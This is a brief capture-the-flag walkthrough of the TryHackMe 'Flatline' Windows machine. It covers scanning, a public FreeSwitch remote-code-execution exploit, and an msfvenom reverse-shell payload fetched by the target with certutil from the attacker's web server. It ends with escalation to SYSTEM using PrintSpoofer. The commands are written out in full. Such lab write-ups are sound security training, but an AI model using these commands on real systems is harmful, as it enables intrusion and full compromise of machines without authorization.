# Flatline

https://tryhackme.com/room/flatline

A simple windows machine CTF

1. A rustscan revealed 3389 and 8021. It was blocking pings, so doing a detailed scan with `nmap -A -Pn -p 3389,8021` revealed a windows machine running something called 'FreeSwitch'
2. On exploit-db there were two scripts for FreeSwitch that promised RCE. The metasploit one seemed to assume a linux target, so I used the python script: https://www.exploit-db.com/exploits/47799. This with the command 'whoami' proved remote code execution.
3. I created an msfvenom payload on my kali machine with `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.143.37 LPORT=4444 EXITFUNC=thread -f exe-only > shell4444.exe`, then served this with a python webserver. Using certutil, I downloaded it to the machine `certutil.exe -urlcache -split -f "http://10.10.143.37:4444/shell4444.exe" shell4444.exe` and then executed it to get a remote shell as the user nekrotic.
4. `whoami /priv` showed the user had the `SeImpersonatePrivilege` right, and `systeminfo` showed this was a 64bit machine. So I downloaded the 64bit version of printspoofer (https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0), created another msfvenom reverse shell payload, downloaded both to the box and used printspoofer to run the new rev shell exe. This got me a system shell.

Easy peasy.
